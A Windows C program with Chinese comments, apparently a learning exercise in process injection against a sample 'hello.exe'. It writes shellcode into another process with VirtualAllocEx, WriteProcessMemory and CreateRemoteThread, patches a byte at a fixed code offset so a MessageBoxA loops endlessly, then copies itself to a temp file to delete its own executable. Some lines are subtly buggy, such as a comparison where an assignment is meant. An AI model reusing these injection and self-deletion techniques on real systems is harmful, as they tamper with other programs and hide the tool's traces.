/*
	此代码用于让messageBoxA无法退出，yes or no都是原来一样，死循环

*/
#include <windows.h>
#include <stdio.h>
int maxLength=10000;
char codeInjected[]={0x75,0x00};
char codeGetMainBaseAddr[]={
		0x68,0xAA,0xBB,0xCC,0xDD,//AABBCCDD is addr of string "hello.exe" in remote process
		0xB8,0xBB,0xCC,0xDD,0xAA,//BBCCDDAA is addr of addr LoadLibrayA
		0xFF,0xD0,
		0xC3
	};//应不可以加上*这样会变成4个字节一个元素


int main(int argc,char* argv[]){
	int f,g;
	int pid,TID;
	int nWrite;
	int rstr,rcode,old,num,baseMain;
	int codeRemoteAddr;
	DWORD hproc,hthread;	 
	

	char *processName="hello.exe";
	
	
	if (argc < 2) {
        printf("Usage: %s pid\n", argv[0]);
        return -1;
    }
  else if(argc==2){ //这是原始注入代码的程序部分 
  	char pathOrigin[10000];
		char pathClone[10000];
		char cmdLine[512];
		DWORD createCopyFile,hprocOri;
		STARTUPINFO sui;
		PROCESS_INFORMATION procinfo;
		
		pid = atoi(argv[1]);
		if (pid <= 0) {
        	printf("[E]: pid must be positive (pid>0)!\n"); 
        	return -2;
		}
	
		hproc = OpenProcess(
          PROCESS_CREATE_THREAD  | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION   | PROCESS_VM_WRITE 
        | PROCESS_VM_READ, FALSE, pid);
	
		//Step1 :get the base addr of main module in the process "hello.exe"
		//Step1.1:inject the string "hello.exe"
		rstr=(PBYTE)VirtualAllocEx(hproc,0,15,MEM_COMMIT,PAGE_READWRITE);//open the space in remote process
		if(!WriteProcessMemory(hproc, rstr, processName, 10, &num)){
			printf("[E]Write String Failed\n");
			}else 
			{
			printf("[I]Write String Success\n");
			}
	
		__asm{
			mov ebx,offset codeGetMainBaseAddr
			mov eax,dword ptr [rstr]
			mov [ebx+0x1],eax
			}
		printf("[I]Fill addrStr Success\n");
		
		//Step1.2:get the addr of module "LoadLibraryA",and inject into the remote process
		g=LoadLibraryA("kernel32.dll");
  	f=GetProcAddress(g,"LoadLibraryA");
  	//printf("LLA:0x%08x\n",f);
  	printf("[I]Get addrLLA Success\n");
  	__asm{
  		mov ebx,offset codeGetMainBaseAddr
  		mov eax,dword ptr [f]
  		mov [ebx+0x6],eax
  		}
  	printf("[I]Fill addrLLA Success\n");
  
		//Step1.3:struct the binary code to inject
	
		//Step1.4:inject our code into remote process &run the thread to get the base addr of main module
		rcode=(PBYTE)VirtualAllocEx(hproc,0,20,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		if(!WriteProcessMemory(hproc, rcode, codeGetMainBaseAddr, sizeof(codeGetMainBaseAddr), &num)){
			printf("[E]Write codeGetMainBaseAddr Failed\n");
			}
		else{
			printf("[I]Write codeGetMainBaseAddr Success\n");
			}
		hthread = CreateRemoteThread(hproc,NULL, 0, (LPTHREAD_START_ROUTINE)rcode,0, 0 , &TID);
  	WaitForSingleObject(hthread, 0xffffffff);
  	if(!GetExitCodeThread(hthread, &baseMain)){
  		printf("[E]Get exitCode Failed\n");
  		}else 
  		{
  		printf("[I]Get exitCode Success\n");
  		}
  	//printf("baseMain:0x%08x\n",baseMain);
  
  	//释放虚拟内存
  	if(!VirtualFreeEx(hproc,rstr,15,MEM_DECOMMIT)){
			printf("[E]Free ExString Failed\n");
			}else 
			{
				printf("[I]Free ExString Success\n");
			}
  	if(!VirtualFreeEx(hproc,rcode,20,MEM_DECOMMIT)){
			printf("[E]Free ExCode Failed\n");
			}else 
			{
				printf("[I]Free ExCode Success\n");
			}
  
  
  	//Step2:compute the target addr where we modify the origin code into our code & inject our code 
		//Step2.1:compute the target addr
		codeRemoteAddr=baseMain+0x101A;  
		//Step2.2:inject our code
		if(!VirtualProtectEx(hproc,codeRemoteAddr, sizeof(codeInjected), PAGE_EXECUTE_READWRITE, &old)){
		//修改代码段为可写
			printf("[E]Change to be Writable Failed\n");
		}else 
		{
			printf("[I]Change to be Writable Success\n");
		}
		if(!WriteProcessMemory(hproc,codeRemoteAddr, codeInjected, sizeof(codeInjected), &nWrite)){
    	printf("[E]Inject Code Failed\n");        	
      }
       else 
        	{
        		printf("[I]Inject Code Success\n");
        	}
  	if(!VirtualProtectEx(hproc,codeRemoteAddr, sizeof(codeInjected), old, &old)){
		//恢复代码段权限
		printf("[E]Change to be Writable Failed\n");
		}else 
		{
			printf("[I]Change to be Writable Success\n");
		}
  	if (!CloseHandle(hproc)) {
        printf("[E]Process cannot be closed !\n");
    }else 
    {
    	printf("[I]Process is closed. \n");
    }      	
  
  
  	GetModuleFileName(NULL, pathOrigin, 10000);//获取源文件的绝对路径
		GetTempPath(10000, pathClone);//获取临时文件夹的路径
		GetTempFileName(pathClone,"del",0,pathClone);//创建用于删除原文件的文件名
		CopyFile(pathOrigin,pathClone,FALSE);//复制文件
		
		//打开复制文件，并以file_flag_delete_on_close模式打开程序
		createCopyFile=CreateFile(pathClone,0,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_FLAG_DELETE_ON_CLOSE,NULL);
		
		hprocOri==OpenProcess(SYNCHRONIZE,TRUE,GetCurrentProcessId());
		sprintf(cmdLine,"%s %d \"%s\"",pathClone,hprocOri,pathOrigin);//构造输入命令行的指令 备份程序 句柄 “源程序”（待删除）
		//初始化新进程的主窗口特性
		ZeroMemory(&sui,sizeof(sui));
		sui.cb=sizeof(sui);//字节数
		
		CreateProcess(NULL,cmdLine,NULL,NULL,TRUE,0,NULL,NULL,&sui,&procinfo);//以我们构造的命令行指令执行可执行文件，并创建进程
		
		//关闭两个句柄
		CloseHandle(hprocOri);
		CloseHandle(createCopyFile);
		
     
   }else{
   	DWORD hprocOri=(DWORD)atoi(argv[1]);//获取句柄参数
   	WaitForSingleObject(hprocOri,INFINITE);//等待源程序进程结束
   	CloseHandle(hprocOri);//关闭句柄
   	DeleteFile(argv[2]);//删除文件
   	}  
   	return 0;
}